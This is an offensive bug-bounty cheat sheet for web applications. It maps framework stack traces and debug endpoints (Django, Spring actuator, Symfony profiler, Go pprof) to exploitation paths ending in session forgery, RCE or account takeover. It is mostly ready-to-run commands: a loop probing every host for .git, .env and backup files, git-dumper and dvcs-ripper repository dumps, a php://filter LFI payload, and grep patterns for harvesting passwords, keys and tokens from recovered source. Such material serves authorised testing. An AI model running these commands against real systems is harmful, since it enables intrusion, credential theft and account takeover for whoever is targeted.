# Error Disclosure / Debug Endpoints

> Stack traces and framework debug surfaces — chain into secret extraction → ATO.

## Framework Stack Trace Regex
Grep response bodies (4xx and 5xx) for these — each implies a known exploitation playbook.

| Framework | Regex | Exploitation Playbook |
|-----------|-------|----------------------|
| Django | `Traceback \(most recent call last\)` | Check DEBUG=True page → DB creds, SECRET_KEY → forge sessions |
| Spring/Java | `at \S+\(.*\.java:\d+\)\|NestedServletException` | Look for `/actuator/*` → `/env` → secrets / JWT key |
| Symfony (PHP) | `Whoops\\Run\|\\\\Symfony\\\\.*\\\\Exception` | Check `/_profiler/` → request tokens → replay/auth bypass |
| Rails | `/app/controllers/\|/gems/.*\.rb:\d+:in` | Check dev mode → web-console RCE |
| ASP.NET (YSOD) | `\[\w+Exception:\|Server Error in '.+' Application` | Check trace.axd, elmah.axd → request replay |
| PHP | `(Warning\|Fatal error\|Notice):.*on line \d+` | Path disclosure → LFI / config leak |
| Node.js | `Error: .*\n\s+at \S+ \(.*:\d+:\d+\)` | Look for `/__debug__/`, source maps |
| Go | `goroutine \d+ \[running\]:\|runtime/panic\.go` | expvar at `/debug/vars`, `/debug/pprof` |

## Framework Debug Surfaces — Not Yet Listed Elsewhere
```
Symfony          /_profiler/             → list every request + tokens → replay user requests
Symfony          /_profiler/phpinfo      → environment dump
Django           /__debug__/             → django-debug-toolbar panels (SQL, settings)
Django           /admin/                 → defaults to /admin/ if not renamed
Next.js          /_next/data/            → SSR payload leak (server-rendered JSON exposed)
Next.js          /_next/static/chunks/   → JS chunks with hardcoded secrets
Go expvar        /debug/vars             → leaks memstats, cmdline, env vars
Go pprof         /debug/pprof/           → goroutine stacks (memory layout, secrets in flight)
Spring Boot      /actuator/heapdump      → full JVM heap → grep secrets out
Spring Boot      /actuator/mappings      → endpoint list including hidden internal routes
Spring Boot      /actuator/loggers       → modify log level to leak more data
GraphQL          ?debug=1 / ?debug=true  → some servers expand errors with debug flag
Java             /META-INF/MANIFEST.MF   → dependency versions → CVE chain
```

## Triggering Stack Traces (When No Debug Endpoint Exposed)
Inject malformed input on existing parameters — many apps still leak traces on unexpected types.

```
Numeric ID → string         /api/user/abc                       → ORM error with column names
Numeric ID → negative       /api/user/-1                        → unhandled signed overflow
Numeric ID → boundary       /api/user/9999999999999999999       → int overflow / type cast error
JSON null where object      {"user": null}                      → NullPointerException
JSON array where object     {"user": []}                        → ClassCastException
Truncated/malformed JSON    {"user":                            → parser stack trace
%00 in path                 /api/user/1%00.json                 → path normalisation difference
Oversized page param        ?page=99999999                      → OOM or query timeout trace
Wrong content-type          POST JSON as Content-Type: text/xml → XML parser dump
Empty multipart boundary    Content-Type: multipart/form-data;  → Busboy / Undici stack trace
```

## Source Disclosure & Extraction (High Leverage Recon)

### Triage Scan — Fire Against Every Live Host
```bash
for host in $(awk '{print $1}' recon/live-hosts.txt); do
  for p in /.git/HEAD /.git/config /.svn/wc.db /.svn/entries /.hg/requires \
           /.bzr/branch-format /.DS_Store /.env /web.config /WEB-INF/web.xml \
           /application.properties /config.php.bak /backup.zip /.git/logs/HEAD; do
    code=$(curl -s -o /dev/null -w "%{http_code}" "$host$p")
    [ "$code" = "200" ] && echo "[HIT] $code  $host$p"
  done
done | tee recon/disclosure-hits.txt
```

### Exposed VCS — Dump It, Don't Just Report the 200
```bash
# Git (most common)
pipx install git-dumper
git-dumper "https://target.com/.git/" /tmp/dump-target
cd /tmp/dump-target
git log --all --oneline
git log -p --all | grep -iE "password|secret|api[_-]?key|token|BEGIN .*PRIVATE KEY"

# SVN
curl -s "https://target.com/.svn/wc.db" -o /tmp/wc.db
sqlite3 /tmp/wc.db "SELECT local_relpath, checksum FROM NODES;"

# Mercurial / Bazaar
curl -s "https://target.com/.hg/requires"
curl -s "https://target.com/.bzr/branch-format"
~/tools/dvcs-ripper/rip-hg.pl  -v -u https://target.com/.hg/
~/tools/dvcs-ripper/rip-bzr.pl -v -u https://target.com/.bzr/
```

### .DS_Store — Recursive Directory Map
```bash
pip install ds-store
python3 ~/tools/ds_store_exp/ds_store_exp.py "https://target.com/.DS_Store"
grep -rilE "backup|admin|config|\.sql|\.zip|\.bak|internal|test" ./target.com/
```

### Backup / Temp / Swap File Fuzzing
```bash
cat recon/urls.txt | unfurl paths | sort -u > recon/known-paths.txt

# Fuzz extensions on known basenames
ffuf -u "https://target.com/configFUZZ" \
     -w <(printf '%s\n' .bak .old .orig .save .swp .swo .tmp .txt '~' .1 .copy .inc .dist .sample) \
     -mc 200 -ac -t 20

# Vim swap recovery
curl -s "https://target.com/.index.php.swp" -o /tmp/index.php.swp && vim -r /tmp/index.php.swp
```

### PHP Source Read — php://filter
```bash
# Requires LFI / file-include sink
curl -s "https://target.com/?page=php://filter/convert.base64-encode/resource=index.php" \
  | grep -oE '[A-Za-z0-9+/=]{40,}' | base64 -d
```

### Env / Config Leaks
| File | Stack | Escalation |
|---|---|---|
| `/.env` `/.env.local` | Laravel/Node/Rails | `DB_PASSWORD`, `APP_KEY`, `AWS_*`, `STRIPE_*` |
| `/web.config` | ASP.NET/IIS | DB connection strings, machineKey (ViewState RCE) |
| `/WEB-INF/web.xml` | Java/Spring | datasource creds, internal servlet mappings |
| `/application.properties` | Spring Boot | DB creds, actuator exposure |
| `/config.php` `/wp-config.php` | PHP/WP/Joomla | DB creds, auth salts, secret keys |
| `/appsettings.json` | .NET Core | connection strings, JWT signing keys |

## What to Do With Recovered Source
```bash
SRC=/tmp/dump-target

# 1) Secrets in tracked files AND in git history
trufflehog filesystem --only-verified "$SRC"
git -C "$SRC" log -p --all 2>/dev/null | grep -iE "password|secret|api[_-]?key|token|AKIA|-----BEGIN"

# 2) Dangerous sinks → confirm injectable path, test live
grep -rnE "eval\(|assert\(|system\(|exec\(|popen\(|unserialize\(|pickle\.loads|yaml\.load|Runtime\.exec" "$SRC"
grep -rnE "(SELECT|INSERT|UPDATE).+\\\$_(GET|POST|REQUEST)|\\.format\(.*request|f\"SELECT" "$SRC"
grep -rnE "include|require|render_template_string|fopen\(.*\\\$_" "$SRC"

# 3) Auth logic you can now bypass with certainty
grep -rniE "debug *= *true|is_admin|jwt.*secret|verify=False|disable.*auth|backdoor|TODO|FIXME" "$SRC"

# 4) Internal hostnames / endpoints not in your URL list
grep -rohE "https?://[a-zA-Z0-9.-]+(:[0-9]+)?(/[^\"' ]*)?" "$SRC" | sort -u
```

> Severity ladder: `path returns 200` = Info → `recovered full source` = Low → `+ verified secret OR confirmed exploitable sink` = High/Critical. Submit at the top of the ladder you can *prove*.